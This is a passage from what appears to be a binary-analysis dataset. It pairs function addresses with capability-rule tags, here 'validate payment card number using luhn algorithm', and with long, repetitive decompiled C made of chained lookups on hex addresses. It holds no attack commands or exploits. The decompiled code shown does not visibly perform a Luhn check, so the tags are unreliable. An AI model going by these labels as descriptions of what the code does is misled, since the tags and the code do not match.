*in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50710c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50712c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50714c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50716c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507178, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdb8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd9c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd9c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd80 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd80 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd64 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd64 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd48 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd48 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd2c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd2c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd2c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd14 = 0x507724;\n        in_stack_fffffd10 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffd14 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffd14);\n        fcn.0049e080(in_stack_fffffd10, in_stack_fffffd14, arg_10h);\n        return in_stack_fffffd10;\n    }\n    fcn.0049c600(*(in_stack_fffffd10 + *(*in_stack_fffffd10 + -0xc) + 0x14) | 1);\n    return in_stack_fffffd10;\n}\n",
        "token_count": 5189
    },
    "004a0900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0900(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffd2c;\n    int32_t in_stack_fffffd30;\n    int32_t *in_stack_fffffd48;\n    int32_t *in_stack_fffffd64;\n    int32_t *in_stack_fffffd80;\n    int32_t *in_stack_fffffd9c;\n    int32_t *in_stack_fffffdb8;\n    int32_t *in_stack_fffffdd4;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50712c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50714c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50716c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507178, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50756c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50758c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdb8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdb8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd9c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd9c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd9c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd80 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd80 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd80 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd64 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd64 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd64 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd48 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffd48 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffd48 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffd30 = 0x507724;\n        in_stack_fffffd2c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffd30 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffd30);\n        fcn.0049e080(in_stack_fffffd2c, in_stack_fffffd30, arg_10h);\n        return in_stack_fffffd2c;\n    }\n    fcn.0049c600(*(in_stack_fffffd2c + *(*in_stack_fffffd2c + -0xc) + 0x14) | 1);\n    return in_stack_fffffd2c;\n}\n",
        "token_count": 5006
    },
    "004a0960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
